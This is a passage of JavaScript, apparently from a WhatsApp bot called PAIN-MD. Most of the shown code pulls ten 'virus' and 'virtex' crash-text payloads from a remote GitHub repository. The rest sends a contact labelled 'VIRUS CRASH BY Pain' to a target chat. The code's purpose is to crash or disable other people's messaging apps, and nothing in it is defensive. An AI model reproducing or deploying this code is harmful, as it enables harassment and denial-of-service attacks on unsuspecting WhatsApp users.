...
let virtex1 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus6.txt').then(v => v.text());
let virtex2 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virtex7.txt').then(v => v.text());
let virtex3 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virtex8.txt').then(v => v.text());
let virtex4 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus9.txt').then(v => v.text());
let virtex5 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virusloc.txt').then(v => v.text()); 
let virtex6 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus1.txt').then(v => v.text());
let virtex7 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus2.txt').then(v => v.text());
let virtex8 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus5.txt').then(v => v.text());
let virtex9 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus4.txt').then(v => v.text());
let virtex10 = await fetch('https://raw.githubusercontent.com/Rosestorycity/PAIN-MD/main/VIRUS/virus3.txt').then(v => v.text());
...
await conn.sendContact(from, '🔥 VIRUS CRASH BY Pain 🔥', fkontaak)}
break   
